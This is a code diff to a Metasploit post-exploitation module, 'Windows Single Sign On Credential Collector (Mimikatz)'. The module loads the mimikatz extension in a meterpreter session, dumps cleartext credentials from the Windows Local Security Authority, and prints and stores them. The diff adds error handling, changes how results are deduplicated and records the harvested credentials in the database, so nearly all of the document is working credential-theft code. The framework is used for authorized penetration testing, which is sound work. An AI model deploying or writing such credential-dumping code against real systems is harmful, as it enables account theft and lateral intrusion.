@@ -6,12 +6,11 @@
 ##
 
 require 'msf/core'
-require 'msf/core/post/file'
+require 'msf/core/post/windows/priv'
 
 class Metasploit3 < Msf::Post
 
 	include Msf::Post::Windows::Priv
-	include Msf::Post::File
 	include Msf::Auxiliary::Report
 
 	def initialize(info={})
@@ -19,7 +18,8 @@ class Metasploit3 < Msf::Post
 			'Name'		 => 'Windows Single Sign On Credential Collector (Mimikatz)',
 			'Description'	 => %q{
 				This module will collect cleartext Single Sign On credentials from the Local
-			Security Authority using the Mimikatz extension.
+			Security Authority using the Mimikatz extension. Blank passwords will not be stored
+			in the database.
 					},
 			'License'	 => MSF_LICENSE,
 			'Author'	 => ['Ben Campbell <eat_meatballs[at]hotmail.co.uk>'],
@@ -29,7 +29,12 @@ class Metasploit3 < Msf::Post
 	end
 
 	def run
-		print_status("Running module against #{sysinfo['Computer']}")
+		if sysinfo.nil?
+			print_error("This module is only available in a windows meterpreter session.")
+			return
+		end
+			print_status("Running module against #{sysinfo['Computer']}")
+
 		if (client.platform =~ /x86/) and (client.sys.config.sysinfo['Architecture'] =~ /x64/)
 			print_error("x64 platform requires x64 meterpreter and mimikatz extension")
 			return
@@ -37,7 +42,12 @@ class Metasploit3 < Msf::Post
 
 		unless client.mimikatz
 			vprint_status("Loading mimikatz extension...")
-			client.core.use("mimikatz")
+			begin
+				client.core.use("mimikatz")
+			rescue Errno::ENOENT
+				print_error("This module is only available in a windows meterpreter session.")
+				return
+			end
 		end
 
 		unless is_system?
@@ -77,16 +87,20 @@ class Metasploit3 < Msf::Post
 			]
 		)
 
-		unique_results = res.index_by { |r| "#{r[:authid]}#{r[:password]}" }.values
+		unique_results = res.index_by { |r| "#{r[:authid]}#{r[:user]}#{r[:password]}" }.values
 
 		unique_results.each do |result|
-			table << [result[:authid], result[:package], result[:domain], result[:user], result[:password].gsub("\n","")]
+			pass = result[:password].gsub("\n","")
+			table << [result[:authid], result[:package], result[:domain], result[:user], pass]
+			report_creds(result[:domain], result[:user], pass)
 		end
 
 		print_line table.to_s
 	end
 
 	def report_creds(domain, user, pass)
+		return if (user.empty? or pass.empty?)
+
 		if session.db_record
 			source_id = session.db_record.id
 		else
@@ -94,7 +108,7 @@ class Metasploit3 < Msf::Post
 		end
 
 		report_auth_info(
-			:host  => session.sock.peerhost,
+			:host  => session.session_host,
 			:port => 445,
 			:sname => 'smb',
 			:proto => 'tcp',
